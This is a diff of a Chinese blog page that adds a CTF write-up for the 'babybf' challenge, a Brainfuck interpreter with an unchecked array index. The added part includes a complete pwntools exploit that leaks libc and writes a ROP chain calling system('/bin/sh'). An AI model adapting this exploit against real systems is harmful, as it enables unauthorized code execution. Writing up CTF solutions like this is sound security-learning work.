@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://nqoinaen.github.io/img/img6.png">
 <meta property="article:published_time" content="2022-11-28T09:42:58.000Z">
-<meta property="article:modified_time" content="2022-11-28T09:20:15.112Z">
+<meta property="article:modified_time" content="2022-11-30T09:06:17.997Z">
 <meta property="article:author" content="nqoinaen">
 <meta property="article:tag" content="arm">
 <meta name="twitter:card" content="summary_large_image">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k 字
+          6.3k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          9 分钟
+          14 分钟
         
       </span>
     
@@ -312,7 +312,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年11月28日 下午
+                    本文最后更新于：2022年11月30日 下午
                   
                 
               </p>
@@ -349,7 +349,83 @@
 <p>连接端口</p>
 <p><code>target remote localhost:8888</code></p>
 <h2 id="babybf">babybf</h2>
-
+<p>赛后分析了下，发现是一道很有意思的题目</p>
+<blockquote>
+<p>Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。</p>
+</blockquote>
+<p>其实本题是一个c语言实现的Brainfuck语言的解释器，就是让我们输入Brainfuck语言去pwn</p>
+<h3 id="分析：-2">分析：</h3>
+<p>当然我们一开始啥都不知道，ida打开程序，主要分析这里的数组</p>
+<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p>这里把我们输入的code当作数组的下标进去转换</p>
+<p>我们看这个数组是啥东西</p>
+<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p>我们要转换到这些00~08的值的话就要送一些特定的字符</p>
+<p>其实这里相当于对应选项v4[0~8],去执行一些命令</p>
+<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<p>我们计算一下地址可以得到对应的字符</p>
+<blockquote>
+<p>例：0：(0x2110-0x2020)/4=0x3c=“&lt;”</p>
+</blockquote>
+<p>总结可得:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0</span>:\x3c --&gt;<span class="hljs-string">&quot;&lt;&quot;</span><br><span class="hljs-number">1</span>:\x3e --&gt;<span class="hljs-string">&quot;&gt;&quot;</span><br><span class="hljs-number">2</span>:\x2b --&gt;<span class="hljs-string">&quot;+&quot;</span><br><span class="hljs-number">3</span>:\x2d --&gt;<span class="hljs-string">&quot;-&quot;</span><br><span class="hljs-number">4</span>:\x2e --&gt;<span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-number">5</span>:\x2c --&gt;<span class="hljs-string">&quot;,&quot;</span><br><span class="hljs-number">6</span>:\x5b --&gt;<span class="hljs-string">&quot;[&quot;</span><br><span class="hljs-number">7</span>:\x5d --&gt;<span class="hljs-string">&quot;]&quot;</span><br><span class="hljs-number">8</span>:\x00<br></code></pre></td></tr></table></figure>
+<p>这其实就是Brainfuck语言的字符标识</p>
+<blockquote>
+<p>Brainfuck程序可以用下面的替换方法翻译成C语言（这题ptr是在栈上）：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Brainfuck</th>
+<th>C</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">&gt;</td>
+<td>++ptr;</td>
+</tr>
+<tr>
+<td style="text-align:left">&lt;</td>
+<td>–ptr;</td>
+</tr>
+<tr>
+<td style="text-align:left">+</td>
+<td>++*ptr;</td>
+</tr>
+<tr>
+<td style="text-align:left">-</td>
+<td>–*ptr;</td>
+</tr>
+<tr>
+<td style="text-align:left">.</td>
+<td>putchar(*ptr);</td>
+</tr>
+<tr>
+<td style="text-align:left">,</td>
+<td>*ptr =getch();</td>
+</tr>
+<tr>
+<td style="text-align:left">[</td>
+<td>while (*ptr) {</td>
+</tr>
+<tr>
+<td style="text-align:left">]</td>
+<td>}</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h3 id="利用：">利用：</h3>
+<p>这题漏洞在数组越界，没对下标做检查</p>
+<p>我们通过调试可得初始位置ptr在<code>0x7fffe0c1eb60</code></p>
+<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p>在栈上的固定偏移如下</p>
+<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
+<p>接下来就好做了，(偏移0x20)泄露libc，(偏移0x38)写rop到ret处执行system(“/bin/sh”)</p>
+<h3 id="Exp">Exp:</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./chall&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims 			:r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&quot;len&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    sea(<span class="hljs-string">&quot;code&gt; &quot;</span>,content)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-comment">#debug()</span><br>cmd(<span class="hljs-string">&quot;&gt;&quot;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&quot;.&gt;.&gt;.&gt;.&gt;.&gt;.&quot;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">0x401B40</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br><br>payload=flat(ret,pop_rdi,binsh,system)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>cmd(<span class="hljs-string">&quot;&gt;&quot;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&quot;,&gt;&quot;</span>*(<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;,&#x27;</span>)<br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+<script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async>
+</script>
                 
               </div>
             
@@ -413,7 +489,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2022年11月28日</div>
+          <div>2022年11月30日</div>
         </div>
       
       
